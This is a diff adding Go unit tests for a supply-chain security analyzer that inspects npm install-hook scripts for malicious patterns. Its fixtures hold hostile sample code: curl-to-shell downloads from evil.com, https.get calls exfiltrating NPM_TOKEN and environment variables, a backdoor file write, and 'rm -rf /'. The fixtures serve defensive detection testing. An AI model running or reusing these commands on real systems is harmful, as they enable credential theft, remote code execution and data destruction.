@@ -1,6 +1,7 @@
 package analyzer
 
 import (
+	"fmt"
 	"strings"
 	"testing"
 )
@@ -2004,5 +2005,467 @@ setup(
 
 	if analysis.RiskLevel != "LOW" {
 		t.Errorf("Expected LOW risk level, got %s", analysis.RiskLevel)
+	}
+}
+
+// ============================================================
+// resolveScriptFilePaths Tests
+// ============================================================
+
+// Test: Resolves simple interpreter + file commands
+// Justification: npm install hooks commonly delegate to script files (e.g., "node scripts/postinstall.js").
+//                If snyft only analyzes the hook string and not the script file, a compromised package
+//                can hide malicious code in the referenced file — a blind spot in supply chain analysis.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — documents install hook
+//         abuse where malicious code resides in referenced script files, not the hook string itself.
+// Methodology: Pass common npm hook command formats to resolveScriptFilePaths
+// Result: Returns the correct file paths extracted from each command
+func TestResolveScriptFilePaths_SimpleCommands(t *testing.T) {
+	tests := []struct {
+		command  string
+		expected []string
+	}{
+		{"node scripts/postinstall.js", []string{"scripts/postinstall.js"}},
+		{"node ./install.js", []string{"install.js"}},
+		{"sh scripts/setup.sh", []string{"scripts/setup.sh"}},
+		{"bash ./scripts/build.sh", []string{"scripts/build.sh"}},
+		{"python setup.py", []string{"setup.py"}},
+		{"./scripts/install.sh", []string{"scripts/install.sh"}},
+	}
+
+	for _, tt := range tests {
+		paths := resolveScriptFilePaths(tt.command)
+		if len(paths) != len(tt.expected) {
+			t.Errorf("resolveScriptFilePaths(%q): expected %d paths, got %d: %v", tt.command, len(tt.expected), len(paths), paths)
+			continue
+		}
+		for i, p := range paths {
+			if p != tt.expected[i] {
+				t.Errorf("resolveScriptFilePaths(%q)[%d]: expected %q, got %q", tt.command, i, tt.expected[i], p)
+			}
+		}
+	}
+}
+
+// Test: Resolves chained commands with && and ;
+// Justification: Attackers chain benign commands with malicious ones (e.g., "echo done && node exfil.js")
+//                to obscure the dangerous script reference. Path resolution must handle command separators.
+// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020) — documents command chaining
+//         as an obfuscation technique in npm supply chain attacks.
+// Methodology: Pass chained commands to resolveScriptFilePaths
+// Result: Returns all file paths from all chained command segments
+func TestResolveScriptFilePaths_ChainedCommands(t *testing.T) {
+	paths := resolveScriptFilePaths("echo hello && node scripts/postinstall.js ; sh scripts/cleanup.sh")
+	expected := []string{"scripts/postinstall.js", "scripts/cleanup.sh"}
+	if len(paths) != len(expected) {
+		t.Fatalf("Expected %d paths, got %d: %v", len(expected), len(paths), paths)
+	}
+	for i, p := range paths {
+		if p != expected[i] {
+			t.Errorf("Path %d: expected %q, got %q", i, expected[i], p)
+		}
+	}
+}
+
+// Test: Skips inline code flags (-e, --eval, -c)
+// Justification: Commands like "node -e 'code'" execute inline code, not files. Attempting to
+//                read "-e" or "'code'" as file paths would produce false positives or errors.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — distinguishes between
+//         inline execution and file-based execution as separate attack vectors.
+// Methodology: Pass commands with inline code flags to resolveScriptFilePaths
+// Result: Returns empty list — no file paths to resolve
+func TestResolveScriptFilePaths_SkipsInlineCode(t *testing.T) {
+	tests := []string{
+		"node -e 'console.log(1)'",
+		"node --eval 'console.log(1)'",
+		"python -c 'print(1)'",
+		"echo hello",
+		"npm run build",
+	}
+	for _, cmd := range tests {
+		paths := resolveScriptFilePaths(cmd)
+		if len(paths) != 0 {
+			t.Errorf("resolveScriptFilePaths(%q): expected no paths, got %v", cmd, paths)
+		}
+	}
+}
+
+// Test: Deduplicates file paths referenced multiple times
+// Justification: The same script file referenced by multiple hooks should only be analyzed once
+//                to avoid duplicate findings that inflate risk scores.
+// Source: OSSF Scorecard methodology — findings should be deduplicated to avoid score inflation.
+// Methodology: Pass a command referencing the same file twice to resolveScriptFilePaths
+// Result: Returns the file path only once
+func TestResolveScriptFilePaths_Deduplication(t *testing.T) {
+	paths := resolveScriptFilePaths("node scripts/setup.js && node scripts/setup.js")
+	if len(paths) != 1 {
+		t.Errorf("Expected 1 deduplicated path, got %d: %v", len(paths), paths)
+	}
+}
+
+// ============================================================
+// analyzeNodeScript Tests
+// ============================================================
+
+// Test: Detects require('child_process') in Node.js scripts
+// Justification: Loading child_process enables arbitrary command execution — the primary
+//                mechanism for malicious npm packages to run payloads, exfiltrate data,
+//                or establish reverse shells at install time.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — child_process is the
+//         most common execution vector in documented npm supply chain attacks.
+// Methodology: Pass script with require('child_process') to analyzeNodeScript
+// Result: Detects require(child_process) pattern with HIGH severity
+func TestAnalyzeNodeScript_ChildProcess(t *testing.T) {
+	content := `const { exec } = require('child_process');
+exec('curl http://evil.com/payload | sh');`
+
+	analysis := analyzeNodeScript(content)
+
+	if !analysis.HasDangerousPatterns {
+		t.Fatal("Expected dangerous patterns for child_process usage")
+	}
+
+	found := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "require(child_process)" {
+			found = true
+			break
+		}
+	}
+	if !found {
+		patterns := []string{}
+		for _, p := range analysis.DangerousPatterns {
+			patterns = append(patterns, p.Pattern)
+		}
+		t.Errorf("Expected require(child_process) pattern, got: %s", strings.Join(patterns, ", "))
+	}
+
+	if analysis.RiskLevel != "HIGH" {
+		t.Errorf("Expected HIGH risk level, got %s", analysis.RiskLevel)
+	}
+}
+
+// Test: Detects HTTP request functions in Node.js scripts
+// Justification: HTTP requests at install time are used for data exfiltration (sending
+//                stolen credentials/tokens to attacker servers) and payload download
+//                (fetching second-stage malware). This is not normal install behavior.
+// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020) — documents HTTP-based
+//         exfiltration as the dominant data theft method in compromised npm packages.
+// Methodology: Pass script with https.get() to analyzeNodeScript
+// Result: Detects HTTP request pattern with HIGH severity
+func TestAnalyzeNodeScript_HTTPRequests(t *testing.T) {
+	content := `const https = require('https');
+https.get('https://evil.com/steal?data=' + process.env.NPM_TOKEN);`
+
+	analysis := analyzeNodeScript(content)
+
+	if !analysis.HasDangerousPatterns {
+		t.Fatal("Expected dangerous patterns for HTTP request")
+	}
+
+	found := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "HTTP request" || p.Pattern == "require(network module)" {
+			found = true
+			break
+		}
+	}
+	if !found {
+		patterns := []string{}
+		for _, p := range analysis.DangerousPatterns {
+			patterns = append(patterns, p.Pattern)
+		}
+		t.Errorf("Expected HTTP request or network module pattern, got: %s", strings.Join(patterns, ", "))
+	}
+}
+
+// Test: Detects fs.writeFileSync to system paths
+// Justification: Writing to system directories (/usr, /etc, /tmp) at install time can
+//                drop persistent backdoors, modify system configuration, or plant malicious
+//                executables that survive package removal.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — documents file system
+//         modification as a persistence mechanism in supply chain attacks.
+// Methodology: Pass script with fs.writeFileSync to /tmp to analyzeNodeScript
+// Result: Detects fs.write to system path pattern with HIGH severity
+func TestAnalyzeNodeScript_FsWriteSystemPath(t *testing.T) {
+	content := `const fs = require('fs');
+fs.writeFileSync('/tmp/backdoor.sh', maliciousPayload);`
+
+	analysis := analyzeNodeScript(content)
+
+	if !analysis.HasDangerousPatterns {
+		t.Fatal("Expected dangerous patterns for fs.writeFileSync to system path")
+	}
+
+	found := false
+	for _, p := range analysis.DangerousPatterns {
+		if p.Pattern == "fs.write to system path" {
+			found = true
+			break
+		}
+	}
+	if !found {
+		patterns := []string{}
+		for _, p := range analysis.DangerousPatterns {
+			patterns = append(patterns, p.Pattern)
+		}
+		t.Errorf("Expected 'fs.write to system path' pattern, got: %s", strings.Join(patterns, ", "))
+	}
+}
+
+// Test: Clean Node.js script has no false positives
+// Justification: Legitimate postinstall scripts (e.g., node-gyp rebuild, patch-package)
+//                are common in npm packages. False positives on benign scripts would
+//                inflate risk scores and reduce trust in the tool.
+// Source: OSSF Scorecard methodology — scoring must not penalize legitimate practices.
+// Methodology: Pass a clean postinstall script to analyzeNodeScript
+// Result: No dangerous patterns, LOW risk level
+func TestAnalyzeNodeScript_CleanScript(t *testing.T) {
+	content := `// Standard postinstall script
+const path = require('path');
+const fs = require('fs');
+
+// Copy config template to the right location
+const src = path.join(__dirname, 'config.template.json');
+const dest = path.join(__dirname, '..', 'config.json');
+
+if (!fs.existsSync(dest)) {
+  fs.copyFileSync(src, dest);
+  console.log('Config file created');
+}
+`
+
+	analysis := analyzeNodeScript(content)
+
+	if analysis.HasDangerousPatterns {
+		patterns := []string{}
+		for _, p := range analysis.DangerousPatterns {
+			patterns = append(patterns, fmt.Sprintf("%s (match: %s)", p.Pattern, p.Match))
+		}
+		t.Errorf("Expected no dangerous patterns for clean script, got: %s", strings.Join(patterns, ", "))
+	}
+
+	if analysis.RiskLevel != "LOW" {
+		t.Errorf("Expected LOW risk level for clean script, got %s", analysis.RiskLevel)
+	}
+}
+
+// ============================================================
+// AnalyzeNPMScriptFiles Tests
+// ============================================================
+
+// Test: Reads and analyzes script file referenced by postinstall hook
+// Justification: A postinstall hook pointing to a malicious script file (e.g.,
+//                "postinstall": "node scripts/postinstall.js") is the most common npm
+//                supply chain attack pattern. Analyzing only the hook string misses
+//                the actual malicious code in the referenced file.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — 83% of documented npm
+//         attacks use postinstall hooks that reference external script files.
+// Methodology: Create mock scripts with a malicious postinstall.js, call AnalyzeNPMScriptFiles
+//              with a mock reader, verify dangerous patterns are found and annotated with file path
+// Result: Detects patterns in the script file with file path and hook name in the report
+func TestAnalyzeNPMScriptFiles_MaliciousPostinstall(t *testing.T) {
+	scripts := map[string]string{
+		"postinstall": "node scripts/postinstall.js",
+		"test":        "jest",
+	}
+
+	mockFiles := map[string]string{
+		"scripts/postinstall.js": `
+const { exec } = require('child_process');
+const https = require('https');
+
+// Exfiltrate environment variables
+const data = JSON.stringify(process.env);
+https.get('https://evil.com/steal?data=' + Buffer.from(data).toString('base64'));
+`,
+	}
+
+	readFile := func(path string) (string, error) {
+		if content, ok := mockFiles[path]; ok {
+			return content, nil
+		}
+		return "", fmt.Errorf("file not found: %s", path)
+	}
+
+	patterns := AnalyzeNPMScriptFiles(scripts, readFile)
+
+	if len(patterns) == 0 {
+		t.Fatal("Expected dangerous patterns from malicious postinstall.js")
+	}
+
+	// Verify patterns are annotated with file path
+	hasFileAnnotation := false
+	for _, p := range patterns {
+		if strings.Contains(p.Match, "scripts/postinstall.js:") {
+			hasFileAnnotation = true
+			break
+		}
+	}
+	if !hasFileAnnotation {
+		t.Error("Expected pattern matches to include file path annotation")
+	}
+
+	// Verify patterns reference the hook name
+	hasHookAnnotation := false
+	for _, p := range patterns {
+		if strings.Contains(p.Description, "postinstall hook") {
+			hasHookAnnotation = true
+			break
+		}
+	}
+	if !hasHookAnnotation {
+		t.Error("Expected pattern descriptions to reference the postinstall hook")
+	}
+}
+
+// Test: Handles missing script files gracefully
+// Justification: npm packages in the registry may reference script files that don't exist
+//                in the git repository (e.g., generated during build, or package.json out of
+//                sync with the repo). Failing on missing files would break the analysis pipeline.
+// Source: OSSF Scorecard methodology — graceful degradation when data is unavailable.
+// Methodology: Create scripts referencing a file that the mock reader can't find
+// Result: Returns empty patterns, no errors or panics
+func TestAnalyzeNPMScriptFiles_MissingFile(t *testing.T) {
+	scripts := map[string]string{
+		"postinstall": "node scripts/missing.js",
+	}
+
+	readFile := func(path string) (string, error) {
+		return "", fmt.Errorf("file not found: %s", path)
+	}
+
+	patterns := AnalyzeNPMScriptFiles(scripts, readFile)
+
+	if len(patterns) != 0 {
+		t.Errorf("Expected no patterns for missing file, got %d", len(patterns))
+	}
+}
+
+// Test: Analyzes shell scripts with generic pattern detection
+// Justification: Some npm packages use shell scripts in their install hooks
+//                (e.g., "postinstall": "sh scripts/setup.sh"). These should be analyzed
+//                with the generic AnalyzeScript patterns, not the Node.js-specific ones.
+// Source: "Towards Measuring Supply Chain Attacks" (NDSS 2020) — shell-based install
+//         scripts are a secondary but documented attack vector in npm packages.
+// Methodology: Create a mock shell script with curl|bash pattern, call AnalyzeNPMScriptFiles
+// Result: Detects dangerous shell patterns in the .sh file
+func TestAnalyzeNPMScriptFiles_ShellScript(t *testing.T) {
+	scripts := map[string]string{
+		"preinstall": "sh scripts/setup.sh",
+	}
+
+	mockFiles := map[string]string{
+		"scripts/setup.sh": `#!/bin/bash
+curl https://evil.com/payload.sh | bash
+`,
+	}
+
+	readFile := func(path string) (string, error) {
+		if content, ok := mockFiles[path]; ok {
+			return content, nil
+		}
+		return "", fmt.Errorf("file not found: %s", path)
+	}
+
+	patterns := AnalyzeNPMScriptFiles(scripts, readFile)
+
+	if len(patterns) == 0 {
+		t.Fatal("Expected dangerous patterns from malicious shell script")
+	}
+
+	found := false
+	for _, p := range patterns {
+		if p.Pattern == "curl/wget | bash" {
+			found = true
+			break
+		}
+	}
+	if !found {
+		patternNames := []string{}
+		for _, p := range patterns {
+			patternNames = append(patternNames, p.Pattern)
+		}
+		t.Errorf("Expected 'curl/wget | bash' pattern, got: %s", strings.Join(patternNames, ", "))
+	}
+}
+
+// Test: Skips non-install hooks (test, build, start)
+// Justification: Only install-time hooks (preinstall, install, postinstall) execute during
+//                package installation. Scripts referenced by build/test/start hooks cannot
+//                compromise a consumer's system at install time.
+// Source: "Backstabber's Knife Collection" (Ohm et al., 2020) — confirms only install-time
+//         hooks are attack vectors; lifecycle hooks like "test" require explicit invocation.
+// Methodology: Create scripts with only non-install hooks pointing to malicious files
+// Result: Returns empty patterns — non-install hooks are not analyzed
+func TestAnalyzeNPMScriptFiles_SkipsNonInstallHooks(t *testing.T) {
+	scripts := map[string]string{
+		"test":  "node scripts/evil-test.js",
+		"build": "node scripts/evil-build.js",
+		"start": "node scripts/evil-start.js",
+	}
+
+	mockFiles := map[string]string{
+		"scripts/evil-test.js":  `const { exec } = require('child_process'); exec('rm -rf /');`,
+		"scripts/evil-build.js": `const { exec } = require('child_process'); exec('rm -rf /');`,
+		"scripts/evil-start.js": `const { exec } = require('child_process'); exec('rm -rf /');`,
+	}
+
+	readFile := func(path string) (string, error) {
+		if content, ok := mockFiles[path]; ok {
+			return content, nil
+		}
+		return "", fmt.Errorf("file not found: %s", path)
+	}
+
+	patterns := AnalyzeNPMScriptFiles(scripts, readFile)
+
+	if len(patterns) != 0 {
+		t.Errorf("Expected no patterns for non-install hooks, got %d: %v", len(patterns), patterns)
+	}
+}
+
+// Test: Clean script file produces no findings
+// Justification: Legitimate postinstall scripts (node-gyp rebuild, type generation, etc.)
+//                should not produce false positives that inflate risk scores.
+// Source: OSSF Scorecard methodology — scoring must not penalize legitimate practices.
+// Methodology: Create a benign postinstall.js that does standard setup tasks
+// Result: Returns empty patterns — no false positives
+func TestAnalyzeNPMScriptFiles_CleanScript(t *testing.T) {
+	scripts := map[string]string{
+		"postinstall": "node scripts/postinstall.js",
+	}
+
+	mockFiles := map[string]string{
+		"scripts/postinstall.js": `
+const path = require('path');
+const fs = require('fs');
+
+// Copy config template
+const src = path.join(__dirname, 'config.template.json');
+const dest = path.join(__dirname, '..', 'config.json');
+
+if (!fs.existsSync(dest)) {
+  fs.copyFileSync(src, dest);
+  console.log('Config file created');
+}
+`,
+	}
+
+	readFile := func(path string) (string, error) {
+		if content, ok := mockFiles[path]; ok {
+			return content, nil
+		}
+		return "", fmt.Errorf("file not found: %s", path)
+	}
+
+	patterns := AnalyzeNPMScriptFiles(scripts, readFile)
+
+	if len(patterns) != 0 {
+		patternNames := []string{}
+		for _, p := range patterns {
+			patternNames = append(patternNames, fmt.Sprintf("%s (match: %s)", p.Pattern, p.Match))
+		}
+		t.Errorf("Expected no patterns for clean script, got: %s", strings.Join(patternNames, ", "))
 	}
 }
